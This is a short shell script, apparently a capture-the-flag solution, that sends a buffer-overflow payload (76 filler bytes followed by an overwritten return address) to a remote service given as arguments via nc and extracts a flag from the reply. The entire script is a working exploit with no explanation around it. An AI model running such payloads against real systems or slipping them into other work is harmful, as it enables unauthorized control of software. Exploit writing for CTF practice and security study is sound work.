#!/bin/sh

echo -n FLAG :
perl -e 'print "A" x 76 . "\x7b\x85\x04\x08\n"' | nc $1 $2 | grep -o LSE{.*}
